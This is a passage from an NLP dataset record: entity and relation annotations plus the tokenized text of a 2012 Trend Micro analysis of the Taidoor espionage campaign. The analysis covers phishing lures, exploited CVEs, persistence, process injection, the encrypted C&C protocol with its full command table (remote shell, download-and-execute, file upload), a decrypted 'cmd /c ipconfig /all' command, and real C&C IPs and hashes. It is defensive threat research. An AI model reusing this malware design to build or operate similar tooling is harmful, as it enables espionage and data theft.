[16, 18], "sent_id": 180, "type": "CourseOfAction"}], [{"name": "Logs from endpoint", "pos": [19, 22], "sent_id": 180, "type": "CourseOfAction"}], [{"name": "network monitoring", "pos": [26, 28], "sent_id": 180, "type": "CourseOfAction"}], [{"name": "Integrity checks", "pos": [0, 2], "sent_id": 181, "type": "CourseOfAction"}], [{"name": "Empowering the human analyst", "pos": [0, 4], "sent_id": 184, "type": "CourseOfAction"}], [{"name": "Trend Micro", "pos": [5, 7], "sent_id": 186, "type": "Organization"}], [{"name": "Deep Discovery", "pos": [0, 2], "sent_id": 187, "type": "Software"}], [{"name": "cut off communications with the C&C server", "pos": [24, 31], "sent_id": 190, "type": "CourseOfAction"}], [{"name": "Determine the scope of the compromise", "pos": [0, 6], "sent_id": 191, "type": "CourseOfAction"}], [{"name": "analyzing the data and forensic artifacts", "pos": [4, 10], "sent_id": 192, "type": "CourseOfAction"}], [{"name": "fortify affected servers", "pos": [11, 14], "sent_id": 193, "type": "CourseOfAction"}], [{"name": "education and training programs", "pos": [10, 14], "sent_id": 197, "type": "CourseOfAction"}], [{"name": "Taidoor", "pos": [13, 14], "sent_id": 269, "type": "Campaign"}], [{"name": "October 2010", "pos": [24, 26], "sent_id": 269, "type": "Time"}], [{"name": "CVE-2012-0158", "pos": [13, 16], "sent_id": 277, "type": "Vulnerability"}], [{"name": "CVE-2009-4324", "pos": [17, 20], "sent_id": 277, "type": "Vulnerability"}], [{"name": "CVE-2010-1297", "pos": [21, 24], "sent_id": 277, "type": "Vulnerability"}], [{"name": "CVE-2010-2883", "pos": [25, 28], "sent_id": 277, "type": "Vulnerability"}], [{"name": "CVE-2011-0611", "pos": [29, 32], "sent_id": 277, "type": "Vulnerability"}], [{"name": "CVE-2011-1269", "pos": [33, 36], "sent_id": 277, "type": "Vulnerability"}], [{"name": "CVE-2009-3129", "pos": [38, 41], "sent_id": 277, "type": "Vulnerability"}]], "labels": [{"r": "P32", "h": 0, "t": 3, "evidence": [17, 20]}, {"r": "P17", "h": 4, "t": 5, "evidence": [22]}, {"r": "P33", "h": 6, "t": 7, "evidence": [28]}, {"r": "P19", "h": 10, "t": 11, "evidence": [35]}, {"r": "P7", "h": 12, "t": 16, "evidence": [36, 37]}, {"r": "P7", "h": 12, "t": 17, "evidence": [36, 37]}, {"r": "P7", "h": 12, "t": 18, "evidence": [36, 37]}, {"r": "P7", "h": 12, "t": 19, "evidence": [36, 37]}, {"r": "P19", "h": 22, "t": 20, "evidence": [39]}, {"r": "P19", "h": 22, "t": 21, "evidence": [39]}, {"r": "P21", "h": 24, "t": 23, "evidence": [49, 50]}, {"r": "P21", "h": 25, "t": 23, "evidence": [49, 51]}, {"r": "P21", "h": 28, "t": 27, "evidence": [64, 69]}, {"r": "P33", "h": 27, "t": 29, "evidence": [64, 70]}, {"r": "P21", "h": 30, "t": 27, "evidence": [64, 71]}, {"r": "P21", "h": 31, "t": 27, "evidence": [64, 72]}, {"r": "P14", "h": 39, "t": 40, "evidence": [93]}, {"r": "P14", "h": 38, "t": 40, "evidence": [92, 93]}, {"r": "P16", "h": 40, "t": 39, "evidence": [93]}, {"r": "P16", "h": 40, "t": 38, "evidence": [92, 93]}, {"r": "P13", "h": 42, "t": 43, "evidence": [99, 101]}, {"r": "P13", "h": 42, "t": 44, "evidence": [99, 101]}, {"r": "P21", "h": 50, "t": 49, "evidence": [113, 115]}, {"r": "P17", "h": 53, "t": 54, "evidence": [142]}, {"r": "P33", "h": 52, "t": 55, "evidence": [142]}, {"r": "P22", "h": 56, "t": 57, "evidence": [168]}, {"r": "P22", "h": 56, "t": 58, "evidence": [168, 171]}, {"r": "P17", "h": 68, "t": 69, "evidence": [186, 187]}, {"r": "P33", "h": 75, "t": 76, "evidence": [269]}], "title": "201208TrendMicroTaidoor", "sents": [["Trend", "Micro", "Incorporated", "Research", "Paper", "2012", "The", "Taidoor", "Campaign"], ["AN", "IN", "-", "DEPTH", "ANALYSIS", "By", ":", "Trend", "Micro", "Threat", "Research", "Team", "CONTENTS", "Introduction", "............................................................................................................................", "1", "Detection", ".................................................................................................................................", "1", "Context", "...................................................................................................................................", "2"], ["Attack", "Vectors", "......................................................................................................................"], ["2", "Social", "Engineering", "Ploy", ".................................................................................................", "2"], ["Operations", "............................................................................................................................."], ["3", "Technical", "Indicators", "............................................................................................................"], ["3", "System", "Modifications", "....................................................................................................."], ["3", "Persistence", "Mechanism", ".................................................................................................", "3", "Network", "Traffic", "................................................................................................................"], ["3", "Malware", "Analysis", "............................................................................................................."], ["4", "Arrival", "Vectors", "............................................................................................................."], ["4", "Exploits", ",", "Payloads", ",", "and", "Decoy", "Documents", "..........................................................", "4", "Network", "Communication", "..........................................................................................", "5"], ["Complete", "List", "of", "C&C", "Commands", "..........................................................................", "6"], ["Timeline", "..................................................................................................................................", "7"], ["Damage", ".................................................................................................................................", "10"], ["Defending", "Against", "APTs", "..................................................................................................", "10", "Local", "and", "External", "Threat", "Intelligence", "..................................................................."], ["10", "Mitigation", "and", "Cleanup", "Strategy", "................................................................................"], ["11", "Educating", "Employees", "Against", "Social", "Engineering", "................................................", "11", "Data", "-", "Centric", "Protection", "Strategy", ".............................................................................."], ["11", "Trend", "Micro", "Threat", "Protection", "Against", "Taidoor", "Campaign", "Components", "........", "12", "i", "|", "The", "Taidoor", "Campaign", "INTRODUCTION", "DETECTION", "Taidoor", "malware", ",", "detected", "by", "Trend", "Micro", "as", "BKDR_SIMBOT", "variants", ",", "have", "been", "historically", "documented", "for", "their", "use", "in", "targeted", "attacks", "."], ["Using", "techniques", "developed", "to", "match", "the", "network", "traffic"], ["Taidoor", "malware", "generate", "when", "communicating", "with", "a", "command", "-", "and", "-", "control", "(", "C&C", ")", "server", ",", "we", "were", "able", "to", "identify", "victims", "that", "these", "appeared", "to", "have", "compromised", "."], ["All", "of", "the", "compromise", "victims", "we", "discovered", "were", "from", "Taiwan", ",", "the", "majority", "of", "which", "were", "government", "organizations", "."], ["Looking", "at", "threat", "intelligence", "derived", "from", "tracking", "advanced", "persistent", "threat", "(", "APT", ")", "campaigns", "over", "time", ",", "we", "were", "able", "to", "develop", "indicators", "of", "compromise", "primarily", "based", "on", "the", "network", "traffic", "generated", "by", "the", "malware", "used", "in", "the", "Taidoor", "campaign", "."], ["Using", "data", "collected", "from", "the", "Trend", "Micro", "\u2122", "Smart", "Protection", "Network", "\u2122", ",", "we", "are", "able", "to", "identify", "victims", "whose", "networks", "communicated", "with", "Taidoor", "C&C", "servers", "."], ["While", "we", "are", "unable", "to", "determine", "the", "exact", "method", "by", "which", "any", "of", "the", "victims", "\u2019", "networks", "were", "compromised", ",", "the", "information", "we", "collected", "did", "indicate", "which", "specific"], ["Taidoor", "malware", "samples", "contacted", "which", "C&C", "servers", "."], ["We", "also", "obtained", "email", "samples", "associated", "with", "the", "delivery", "of", "the", "Taidoor", "malware", "samples", "."], ["As", "such", ",", "we", "were", "able", "to", "provide", "an", "overview", "of", "the", "Taidoor", "campaign", ",", "including", "the", "attack", "vectors", "and", "malware", "the", "attackers", "used", ",", "and", "come", "up", "with", "a", "remediation", "strategy", "."], ["1", "|", "The", "Taidoor", "Campaign", "CONTEXT", "ATTACK", "VECTORS"], ["The", "Taidoor", "attackers", "have", "been", "actively", "engaging", "in", "targeted", "attacks", "since", "at", "least", "March", "4", ",", "2009", "."], ["Despite"], ["some", "exceptions", ",", "the", "Taidoor", "campaign", "often", "used", "Taiwanese", "IP", "addresses", "as", "C&C", "servers", "and", "email", "addresses", "to", "send", "out", "socially", "engineered", "emails", "with", "malware", "as", "attachments", "."], ["One", "of", "the", "primary", "targets", "of", "the", "Taidoor", "campaign", "appeared", "to", "be", "the", "Taiwanese", "government", "."], ["The", "attackers", "spoofed", "Taiwanese", "government", "email", "addresses", "to", "send", "out", "socially", "engineered", "emails", "in", "the", "Chinese", "language", "that", "typically", "leveraged", "Taiwan", "-", "themed", "issues", "."], ["The", "attackers", "actively", "sent", "out", "malicious", "documents", "and", "maintained", "several", "IP", "addresses", "for", "command", "and", "control", "."], ["The", "Taidoor", "campaign", "exploits", "a", "wide", "variety", "of", "vulnerabilities", "as", "attack", "vectors", ",", "old", "and", "new", "alike", "."], ["Data", "from", "the", "early", "part", "of", "this", "year", "shows", "that", "the", "Taidoor", "attackers", "rampantly", "used", "malicious", ".DOC", "files", "to", "exploit", "a", "Microsoft", "Common", "Controls", "vulnerability", ",", "CVE-2012-", "0158", "."], ["1", "Historical", "data", ",", "on", "the", "other", "hand", ",", "shows", "that", "the", "Taidoor", "attackers", "also", "distributed", "emails", "with", "malicious", ".PDF", "file", "attachments", "that", "exploited", "Adobe", "Reader", ",", "Acrobat", ",", "or", "Flash", "Player", "vulnerabilities", "("], ["e.g.", ",", "CVE-20094324", ",", "2CVE-2010", "-", "1297", ",", "3", "CVE-2010", "-", "2883", ",", "4", "and", "CVE-20110611", ")", "."], ["5"], ["They", "also", "used", "malicious", "Microsoft", "Excel", "and", "PowerPoint", "files", "(", "e.g.", ",", "CVE-2011", "-", "1269", "6", "and", "CVE-20093129", ")", "7", "to", "exploit", "old", "vulnerabilities", "in", "Microsoft", "Office", "."], ["S", "ocial", "E", "ngineer", "ing", "P", "loy"], ["As", "part", "of", "their", "social", "engineering", "ploy", ",", "the", "Taidoor", "attackers", "attach", "a", "decoy", "document", "to", "their", "emails", "that", ",", "when", "opened", ",", "displays", "the", "contents", "of", "a", "legitimate", "document", "but", "executes", "a", "malicious", "payload", "in", "the", "background", "."], ["1", "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE2012-0158", "2", "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-20094324", "3", "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-20101297", "4", "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-20102883", "5", "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-20110611", "6", "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-20111269", "7", "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-20093129", "2", "|", "The", "Taidoor", "Campaign", "OPERATIONS", "TECHNICAL", "INDICATORS"], ["We", "were", "only", "able", "to", "gather", "a", "limited", "amount", "of", "information", "regarding", "the", "Taidoor", "attackers", "\u2019", "activities", "after", "they", "have", "compromised", "a", "target", "."], ["We", "did", ",", "however", ",", "find", "that", "the", "Taidoor", "malware", "allowed", "attackers", "to", "operate", "an", "interactive", "shell", "on", "compromised", "computers", "and", "to", "upload", "and", "download", "files", "."], ["In", "order", "to", "determine", "the", "operational", "capabilities", "of", "the", "attackers", "behind", "the", "Taidoor", "campaign", ",", "we", "monitored", "a", "compromised", "honeypot", "."], ["The", "attackers", "issued", "out", "some", "basic", "commands", "in", "an", "attempt", "to", "map", "out", "the", "extent", "of", "the", "network", "compromise", "but", "quickly", "realized", "that", "the", "honeypot", "was", "not", "an", "intended", "targeted", "and", "so", "promptly", "disabled", "the", "Taidoor", "malware", "running", "on", "it", "."], ["This", "indicated", "that", "while", "Taidoor", "malware", "were", "more", "widely", "distributed", "compared", "with", "those", "tied", "to", "other", "targeted", "campaigns", ",", "the", "attackers", "could", "quickly", "assess", "their", "targets", "and", "distinguish", "these", "from", "inadvertently", "compromised", "computers", "and", "honeypots", "."], ["S", "ystem", "Modifications"], ["Opening", "a", "malicious", "document", "(", "i.e.", ",", ".PDF", ",", ".DOC", ",", ".XLS", ",", "or", ".PPT", "file", ")", "allows", "the", "Taidoor", "malware", "to", "create", "two", "files", "in", "a", "user", "\u2019s", "Temp", "folder", "\u2014", "C:\\Documents", "and", "Settings\\[USER]\\Local", "Settings\\Temp", "."], ["The", "first", "file", "is", "typically", "a", "small", "executable", "file", "(", "i.e.", ",", "17.5", "KB", ")", "named", "\u201c", "[", "2", "characters].tmp", ".", "\u201d"], ["This", "is", "copied", "to", "another", "folder", ",", "usually", "C:\\Documents", "and", "Settings\\[USER]\\Local", "Settings", ",", "and", "renamed", "to", "\u201c", "~dfds3.reg", ",", "\u201d", "which", "modifies", "the", "Windows", "Registry", "before", "being", "deleted", "."], ["P", "er", "sistence", "Mechanism"], ["The", "Taidoor", "malware", "uses", "the", "file", ",", "~dfds3.reg", ",", "to", "modify", "the", "Windows", "Registry", "in", "order", "to", "maintain", "persistence", "."], ["While", "the", "names", "of", "the", "registry", "entries", "and", "the", "executable", "files", "may", "vary", ",", "these", "consistently", "modified", "the", "key", ",", "HKCU\\SOFTWARE\\Microsoft\\Windows\\", "CurrentVersion\\Run", "."], ["Networ", "k", "T", "r", "affic"], ["The", "Taidoor", "malware", "produces", "identifiable", "network", "traffic", "."], ["These", "often", "directly", "accessed", "an", "IP", "address", "."], ["Sometimes", ",", "however", ",", "certain", "samples", "made", "use", "of", "domain", "names", "for", "HTTP", "communication", "."], ["In", "such", "a", "case", ",", "the", "GET", "and", "POST", "requests", "contained", "a", "URL", "path", "such", "as", ":", "aaaaa.php?id=bbbbbbcccccccccccc", "\u201c", "aaaaa", "\u201d", "refers", "to", "five", "random", "characters", "that", "form", "a", "file", "name", "such", "as", "\u201c", "qfgkt.php", ",", "\u201d", "followed", "by", "\u201c", "bbbbbb", ",", "\u201d", "six", "pseudorandomly", "generated", "characters", "that", "change", "for", "each", "connection", "."], ["\u201c", "cccccccccccc", "\u201d", "refers", "to", "12", "characters", "that", "represent", "the", "compromised", "host", "\u2019s", "MAC", "address", "that", "is", "obfuscated", "using", "a", "custom", "algorithm", "."], ["The", "compromised", "host", "\u2019s", "MAC", "address", "is", "communicated", "to", "the", "Taidoor", "C&C", "server", "this", "way", "because", "it", "is", "used", "as", "an", "RC4", "encryption", "key", "to", "encrypt", "the", "subsequent", "network", "communication", "between", "the", "compromised", "host", "and", "the", "C&C", "server", "."], ["3", "|", "The", "Taidoor", "Campaign", "Malwar", "e", "Analysis"], ["Arrival", "Vectors"], ["The", "majority", "of", "the", "Taidoor", "malware", "samples", "we", "have", "seen", "in", "the", "wild", "were", "delivered", "via", "email", "."], ["We", "also", "saw", "considerable", "variations", "among", "the", "email", "and", "IP", "addresses", "the", "senders", "used", "."], ["We", "listed", "down", "some", "of", "the", "emails", "that", "were", "sent", "via", "an", "IP", "address", "that", "also", "served", "as", "a", "C&C", "server", "below", "."], ["This", "was", "one", "of", "the", "IP", "addresses", "that", "some", "compromised", "systems", "accessed", "."], ["While", "we", "do", "not", "exactly", "know", "how", "the", "compromises", "occurred", ",", "we", "can", ",", "based", "on", "the", "attackers", "\u2019", "method", "of", "operation", ",", "determine", "which", "email", "was", "the", "most", "likely", "attack", "vector", "."], ["\u2022", "Sample", "email", "1", "8", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "From", ":", "minaki.yang@yahoo.com", "Subject", ":", "US", "-", "TAIWAN"], ["Date", "sent", ":", "October", "25", ",", "2011"], ["Sender", "\u2019s", "IP", "address", ":", "60.249.219.82"], ["MD5", "hash", ":", "97ff2338e568fc382d41c30c31f89720"], ["\u2022", "Sample", "email", "2", "9", "\u2022", "\u2022", "\u2022", "\u2022", "From", ":", "[", "redacted]@wpafb.af.mil", "Subject", ":", "20111012"], ["Sender", "\u2019s", "IP", "address", ":", "60.249.219.82"], ["MD5", "hash", ":", "5fd848000d68f45271a0e1abd5844493", "\u2022", "Sample", "email", "3", "10", "\u2022", "\u2022", "\u2022", "\u2022"], ["From", ":", "95273503@nccu.edu.tw"], ["Subject", ":", "\u7a3f\u4ef6", "\u5982\u9644\u6a94\uff0c\u8acb\u6536\u6089"], ["Sender", "\u2019s", "IP", "address", ":", "60.249.219.82"], ["MD5", "hash", ":", "8406c1ae494add6e4f0e78b476fb4db0", "Exploits", ",", "Payloads", ",", "and", "Decoy", "Documents"], ["The", "shellcode", "in", "the", "exploit", "document", "is", "commonly", "encrypted", "."], ["To", "successfully", "exploit", "a", "vulnerability", ",", "the", "shellcode", "is", "first", "decrypted", "."], ["It", "then", "searches", "for", "the", "filehandle", "of", "the", "exploit", "document", "by", "comparing", "the", "file", "sizes", "of", "enumerated", "handles", "to", "a", "hardcoded", "file", "size", "that", "is", "supposed", "to", "be", "that", "of", "the", "exploit", "document", "."], ["Once", "the", "handle", "is", "found", ",", "two", "buffers", "are", "read", "from", "the", "exploit", "document", ",", "which", "contains", "the", "encrypted", "payload", "and", "an", "encrypted", "decoy", "document", "."], ["The", "payload", "is", "then", "decrypted", "and", "saved", "as", "a", "file", "in", "the", "Windows", "temporary", "directory", "."], ["The", "payload", "is", "then", "commonly", "executed", "using", "the", "WinExec", "application", "programming", "interface", "(", "API", ")", "."], ["After", "the", "payload", "is", "executed", ",", "the", "decoy", "document", "is", "decrypted", "and", "also", "saved", "in", "the", "Windows", "temporary", "directory", "."], ["The", "decoy", "document", "is", "then", "opened", "in", "a", "new", "window", "of", "the", "exploited", "application", "to", "convince", "the", "victim", "that", "nothing", "is", "wrong", "with", "his", "/", "her", "system", "."], ["The", "process", "that", "executed", "the", "exploit", "shellcode", "is", "then", "terminated", "."], ["Keen", "observation", "would", "also", "reveal", "that", "the", "document", "a", "victim", "opened", "was", "a", "decoy", "because", "its", "file", "name", "differs", "from", "the", "name", "of", "the", "original", "document", "that", "was", "exploited", "."], ["The", "main", "purpose", "of", "the", "specially", "crafted", "file", "attachments", "is", "to", "silently", "drop", "and", "install", "BKDR_SIMBOT", "variants", "in", "the", "target", "\u2019s", "computer", "."], ["11"], ["These", "BKDR_SIMBOT", "variants", "include", "BKDR_SIMBOT.SMXA", "and"], ["BKDR_SIMBOT.SME", ",", "the", "generic", "Trend", "Micro", "detection", "names", "for", "SIMBOT", "malware", "."], ["In", "other", "instances", ",", "the", "binary", "poses", "as", "an", "Adobe", "Flash", "Player", "installer", "or", "uninstaller", "with", "a", "file", "size", "of", "17,925", "bytes", "."], ["The", "file", "was", "written", "using", "Borland", "\u2019s", "Delphi", ",", "compiled", "on", "a", "machine", "whose", "default", "language", "was", "set", "to", "Chinese", "(", "Simplified", ")", ",", "and", "did", "not", "use", "any", "known", "binary", "packer", "."], ["8", "http://targetedemailattacks.tumblr.com/post/12137336947/fak", "e", "-", "excel", "-", "from", "-", "ibm111", "9", "http://targetedemailattacks.tumblr.com/post/11377987600/ma", "licious", "-", "excel", "10"], ["http://contagiodump.blogspot.com/2011/10/sep-28-cve-20103333-manuscript-with.html", "4", "|", "The", "Taidoor", "Campaign", "11", "http://aboutthreats.trendmicro.com/malware.aspx?language=us&name=BK"], ["DR_SIMBOT.SMXA", "Figure", "2", "."], ["File", "structure", "of", "encrypted", "SIMBOT", "malware", "variants", "Network", "Communication"], ["The", "binary", "file", "contacts", "the", "C&C", "server", "for", "commands", "that", "it", "then", "executes", "on", "the", "victim", "\u2019s", "machine", "."], ["Communication", "with", "the", "C&C", "server", "is", "done", "through", "HTTP", "and", "uses", "RC4", "encryption", "for", "the", "data", "sent", "and", "received", "."], ["Figure", "1", "."], ["File", "properties", "of", "the", ".TMP", "of", "the", "malicious", "executable", "file"], ["The", "main", "purpose", "of", "the", "dropped", "binary", "file", "is", "to", "install", "an", "RC4", "-", "encrypted", "executable", "file", ",", "specifically", "in", "the", ".data", "segment", ",", "in", "the", "memory", "space", "of", "a", "known", "Windows", "Service", "Process", "."], ["If", "the", "registry", ",", "HKLM\\SOFTWARE\\McAfee", ",", "is", "found", "in", "the", "target", "\u2019s", "machine", ",", "the", "malware", "injects", "the", "executable", "file", "in", "the", "services.exe", "process", "."], ["If", "not", ",", "it", "injects", "the", "executable", "file", "in", "svchost.exe", "."], ["The", "executable", "file", "is", "written", "using", "C++", "and", "has", "a", "file", "size", "of", "about", "11,776", "bytes", "."], ["It", "is", "not", "protected", "nor", "packed", "using", "any", "known", "binary", "protector", "or", "packer", "and", "has", "a", "pretty", "straightforward", "code", "."], ["The", "code", "seeks", "out", "inactive", "services", "and", "pseudorandomly", "chooses", "one", ",", "which", "it", "then", "tries", "to", "kill", "."], ["If", "successful", ",", "it", "uses", "the", "service", "\u2019s", "name", "as", "file", "name", "for", "the", "copy", "created", "in", "the", "victim", "\u2019s", "Temp", "folder", "then", "creates", "an", "autorun", "registry", "entry", "for", "the", "binary", "."], ["If", "not", ",", "\u201c", "WinHttp", "\u201d", "is", "prepended", "to", "the", "service", "\u2019s", "name", "."], ["5", "|", "The", "Taidoor", "Campaign", "Figure", "3", "."], ["Network", "communication", "between", "a", "Taidoorcompromised", "machine", "and", "a", "Taidoor", "C&C", "server"], ["The", "initial", "request", "to", "the", "C&C", "server", "is", "formatted", "as", "follows", ":"], ["[", "C&C]/{5", "random", "characters}.php?id={6", "random", "numbers}{encrypted", "victim", "\u2019s", "MAC", "address", "}"], ["The", "victim", "\u2019s", "MAC", "address", "is", "sent", "to", "the", "C&C", "server", ",", "as", "this", "is", "used", "as", "key", "to", "encrypt", "the", "data", "exchanged", "by", "the", "victim", "\u2019s", "machine", "and", "the", "C&C", "server", "."], ["The", "MAC", "address", "is", "encrypted", "using", "a", "custom", "algorithm", ",", "which", "basically", "increases", "the", "values", "in", "the", "address", "by", "1", "."], ["As", "shown", "in", "Figure", "4", ",", "the", "C&C", "server", "responds", "with", "encrypted", "data", "."], ["Since", "we", "know", "the", "encryption", "algorithm", "used", "and", "that", "the", "key", "is", "the", "MAC", "address", ",", "we", "were", "able", "to", "decrypt", "it", "."], ["Complete", "List", "of", "C&C", "Commands"], ["The", "decrypted", "C&C", "command", "was", "formatted", "in", "the", "following", "manner", ":"], ["[", "command", "type][command", "string", "]", "MAC", "address", "of", "analysis", "machine", ":", "08", "-", "00", "-", "2733", "-", "9C-23", "Encrypted", "data", ":", "\ufffd", "*", "\u4694l"], ["\ufffd", "\ufffd", "\ufffd", "S"], ["\ufffd", "W", "4", "\ufffd", "T", "\ufffd"], ["\ufffd"], ["F+UO", "Decrypted", "data", ":", "cmd", "/", "c", "ipconfig", "/", "all", "Command", "type", ":", "3", "Command", "string", ":", "cmd", "/", "c", "ipconfig", "/", "all", "The", "decrypted", "data", "shows", "that", "the", "C&C", "server", "is", "interested", "in", "IP", "configuration", "-", "related", "data", "in", "the", "victim", "\u2019s", "machine", "."], ["The", "output", "of", "the", "command", "is", "then", "encrypted", "and", "sent", "to", "the", "C&C", "server", "."], ["Command", "type", "refers", "to", "a", "hex", "digit", "that", "can", "be", "[", "0x2", "]", ","], ["[", "0x3", "]", ",", "[", "0x4", "]", ",", "[", "0x5", "]", ",", "or", "[", "0x7", "]", ",", "which", "identifies", "what", "it", "will", "do", "with", "the", "command", "string", "."], ["Command", "string", ",", "on", "the", "other", "hand", ",", "refers", "to", "a", "set", "of", "strings", "relevant", "to", "the", "command", "type", "."], ["Table", "1", "shows", "the", "full", "capabilities", "of", "the", "injected", "binary", "."], ["Command", "Description", "0x2", "\u2014", "sleep", "command", "The", "binary", "waits", "for", "a", "specified", "amount", "of", "time", "before", "requesting", "another", "command", "from", "the", "C&C", "server", "."], ["0x3", "\u2014", "execute", "commands", "on", "the", "system"], ["(", "i.e.", ",", "cmd", "/", "c"], ["This", "can", "be", "used", "to", "explore", "the", "data", "or", "files", "in", "the", "victim", "\u2019s", "machine", "for", "reporting", "back", "to", "the", "C&C", "server", "."], ["This", "can", "also", "be", "used", "to", "explore", "the", "network", "to", "which", "the", "compromised", "machine", "is", "connected", "."], ["0x4", "\u2014", "download", "and", "execute", "file"], ["This", "can", "be", "used", "to", "install", "additional", "files", "in", "the", "victim", "\u2019s", "machine", "."], ["0x5", "\u2014", "download", "files", "from", "the", "C&C", "server", "The", "binary", "downloads", "but", "does", "not", "execute", "files", "from", "the", "C&C", "server", "."], ["0x7", "\u2014", "upload", "files", "from", "infected", "machine", "to", "the", "C&C", "server"], ["This", "can", "be", "used", "to", "exfiltrate", "data", "or", "files", "from", "the", "victim", "\u2019s", "network", "to", "the", "C&C", "server", "."], ["ipconfig", "/", "all", ")", "6", "|", "The", "Taidoor", "Campaign", "TIMELINE", "Using", "the", "Taidoor", "C&C", "servers", "we", "found", "using", "Trend", "Micro", "Smart", "Protection", "Network", "data", ",", "we", "constructed", "a", "timeline", "that", "indicates", "related", "activities", "as", "early", "as", "October", "2010", "(", "see", "Table", "2", ")", "."], ["While", "we", "saw", "gaps", "in", "-", "between", "activities", ",", "notably", "between", "November", "2010", "and", "February", "2011", ",", "we", "consistently", "discovered", "malware", "samples", "connect", "to", "this", "infrastructure", "."], ["The", "dates", "when", "these", "were", "discovered", "may", "indicate", "exact", "dates", "of", "compromise", "."], ["MD5", "HASH", "DETECTION"], ["C&C", "SERVER", "DATE", "SEEN", "2d33005a26a9cb2063dde2fa179b453e", "216.139.109.156", "10/12/2010"], ["4b92f9b403fa59a35edf5af2f1aa98fb", "216.139.109.156", "10/12/2010"], ["95bfeb4b7b8edb2517ede938bf9791d9", "216.139.109.156", "10/12/2010", "5dd13efe319f0cdfe75346a46c1b791b", "TROJ_GEN.R42C3JR", "211.35.222.6", "10/14/2010", "1de1a60f51829e5e0d30dfd4b5197a72"], ["TROJ_DLOADE.SMJ"], ["216.139.109.156", "10/22/2010", "608bae3e4a59e4954f9bf43e504e2340", "TROJ_GEN.R47E1K9", "211.35.222.6", "10/27/2010"], ["b80da571f2cd7eab4aec12eee8199289", "TROJ_DLOADE.SMJ", "60.250.39.73", "11/23/2010", "0998743b808b57f6707641be64fa4fcd"], ["TROJ_DLOADR.TDG", "211.35.222.6", "2/25/2011", "920a7857da9ee7b403f3077660eddf31"], ["TROJ_DLOADR.TDG", "211.35.222.6", "2/25/2011"], ["d28b1b2824fd26d18f851e7605660f74", "TROJ_GEN.R21C3E6", "216.139.109.156", "4/15/2011", "265785ccc9503d30465156b90afa2523", "TROJ_GEN.R3EC2G4", "216.139.109.156", "4/28/2011", "7488ffd5d9c1751d1ceca88a4231304b", "TROJ_GEN.R4FCRBC", "216.139.109.156", "7/7/2011", "ecd97b7cfb4c8715d7800a9808a1646f"], ["TROJ_INJECT.ZZXX", "216.139.109.156", "8/10/2011"], ["6703dd35f6f56f35d298b9cd4c73e9cb", "BKDR_SIMBO.DUKKS", "216.139.109.156", "8/29/2011", "8406c1ae494add6e4f0e78b476fb4db0", "TROJ_ARTIEF.VTG", "60.249.219.82", "10/6/2011", "5fd848000d68f45271a0e1abd5844493", "TROJ_MSDROP.ZZXX", "60.249.219.82", "10/12/2011", "a0fff659499a4a76af2b89d28d0eafa2"], ["TROJ_GEN.R3EC1J7", "216.139.109.156", "10/14/2011", "97ff2338e568fc382d41c30c31f89720", "HEUR_OLEXP.A", "60.249.219.82", "10/30/2011", "d39981092a2f9a4b40413b38917ca573", "TROJ_GEN.R49C7KI", "61.222.205.180", "11/2/2011", "61.222.190.100", "11/6/2011", "f43c9cc84fa7c16321241bb3c0802760", "7", "|", "The", "Taidoor", "Campaign", "MD5", "HASH", "DETECTION"], ["C&C", "SERVER", "DATE", "SEEN", "c2cb594246942c328d8b11d4696a05c0"], ["BKDR_SIMBOT.SMC", "61.218.233.51", "4/30/2012", "63.135.55.13", "4/30/2012", "203.146.189.160", "4/7/2012", "203.150.231.236", "4/7/2012", "222.101.218.86", "5/29/2012", "64.34.60.218", "5/29/2012", "203.90.100.21", "5/29/2012", "65a0716af402727247296649abda7be6", "4a1365bdef0773aa0d3d33877d5a5334", "BKDR_SIMBOT.SMC", "BKDR_SIMBOT.SMC", "7f82c77a1f1b36f392f2f1763e2cc119", "BKDR_SIMBOT.SMC", "203.146.189.141", "4/30/2012"], ["ac75e62b36f4e845c1a095c9bcc43896", "TROJ_DLOADR.WKJ", "62.13.61.173", "4/2/2012", "61.218.233.51", "4/2/2012", "63.135.55.13", "4/2/2012", "112.217.74.188", "6/13/2012", "203.114.103.58", "6/13/2012", "5eb86d098a5ab48c7173545829008636"], ["BKDR_SIMBOT.SMC", "85c64f43de8cb83234ee21fb0234f256", "BKDR_SIMBOT.SMC", "203.146.189.141", "5/14/2012", "7f82c77a1f1b36f392f2f1763e2cc119", "BKDR_SIMBOT.SMC", "85.43.157.110", "4/30/2012", "203.116.147.94", "4/30/2012", "58.40.20.165", "4/30/2012", "213.50.91.196", "5/14/2012", "211.22.72.193", "5/14/2012", "69.178.171.135", "5/17/2012", "202.40.188.10"], ["5/17/2012", "85c64f43de8cb83234ee21fb0234f256", "ffe76a043871638ec5e953084af1a2d8", "BKDR_SIMBOT.SMC", "BKDR_SIMBOT.SME", "20db3ff24701f4adac3cc61b591b6c98"], ["BKDR_SIMBOT.SME", "60.248.216.194", "5/7/2012", "85c64f43de8cb83234ee21fb0234f256", "BKDR_SIMBOT.SMC", "201.159.226.189", "5/14/2012"], ["202.251.249.222", "5/14/2012", "222.101.218.86", "5/7/2012"], ["64.34.60.218", "5/7/2012", "20db3ff24701f4adac3cc61b591b6c98", "8", "|", "The", "Taidoor", "Campaign", "BKDR_SIMBOT.SME", "MD5", "HASH", "6b5ca357066b40def382a1e130fb87cb", "9", "|", "The", "Taidoor", "Campaign", "DETECTION"], ["BKDR_SIMBOT.SME", "C&C", "SERVER", "DATE", "SEEN", "203.90.100.21", "5/7/2012", "210.65.11.11", "4/25/2012", "DAMAGE"], ["DEFENDING", "AGAINST", "APTS"], ["After", "analyzing", "of", "the", "Taidoor", "campaign", ",", "we", "saw", "that", "the", "malware", "the", "attackers", "used", "had", "the", "functionality", "normally", "seen", "in", "a", "Remote", "Access", "Trojan", "(", "RAT", ")", "."], ["Based", "on", "the", "command", "capabilities", "of", "the", "Taidoor", "malware", ",", "we", "were", "able", "to", "determine", "that", "data", "theft", "and", "data", "destruction", "was", "possible", "."], ["The", "malware", "also", "had", "the", "ability", "to", "remotely", "and", "sometimes", "randomly", "terminate", "processes", "on", "victims", "\u2019", "machines", "."], ["This", "can", "lead", "to", "the", "termination", "of", "a", "critical", "process", "that", "results", "in", "denial", "of", "service", "(", "DoS", 